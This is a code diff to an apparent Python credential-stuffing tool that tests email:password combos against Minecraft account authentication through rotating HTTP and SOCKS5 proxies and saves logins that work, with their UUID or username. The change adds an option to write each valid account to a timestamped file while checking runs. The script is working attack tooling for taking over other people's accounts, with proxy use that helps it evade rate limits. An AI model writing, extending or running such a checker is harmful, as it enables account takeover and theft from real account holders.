@@ -64,6 +64,9 @@ try_amount = int(input("How many times an account should be tested before markin
 
 output_format =  int(input("What format should the output file be? Default is 1 \n1: email:password \n2: email:password:uuid \n3: email:password:username\n") or "1")
 
+save_variant =  int(input("When should the accounts get saved? Default is 1 \n1: When checking finished (recommended) \n2: While checking (Can be buggy when using many threads)\n") or "1")
+
+
 print("Starting to check proxies")
 
 if http_proxy_path:
@@ -78,6 +81,9 @@ if socks5_proxy_path:
 print("Done proxy checking")
 
 header = {"content-type": "application/json"}
+
+file_name = time.strftime("minecraft_%d-%m-%Y %H-%M-%S.txt")
+
 
 class stats:
     working = 0
@@ -123,10 +129,16 @@ def check(x):
                 ign = answer_json["selectedProfile"]["name"]
                 uuid = answer_json["selectedProfile"]["id"]
                 if output_format == 1:
+                    if save_variant == 2:
+                        open(file_name, "a").write(f"{combo}\n")
                     working_accounts.append(combo)
                 if output_format == 2:
+                    if save_variant == 2:
+                        open(file_name, "a").write(f"{combo}:{uuid}\n")
                     working_accounts.append(combo + ":" + uuid)
                 if output_format == 3:
+                    if save_variant == 2:
+                        open(file_name, "a").write(f"{combo}:{ign}\n")
                     working_accounts.append(combo + ":" + ign)
                 stats.working += 1
                 return
@@ -168,10 +180,7 @@ running = False
 print("Checking complete")
 print("I found: " + str(len(working_accounts)) + " working accounts!")
 
-file_name = time.strftime("minecraft_%d-%m-%Y %H-%M-%S.txt")
 
-accounts_string = ""
-for account in working_accounts:
-    accounts_string = accounts_string + account + "\n"
-open(file_name, "w").write(accounts_string)
+if save_variant == 1:
+    open(file_name, "w").write("\n".join(working_accounts))
 input("Done uwu\n")
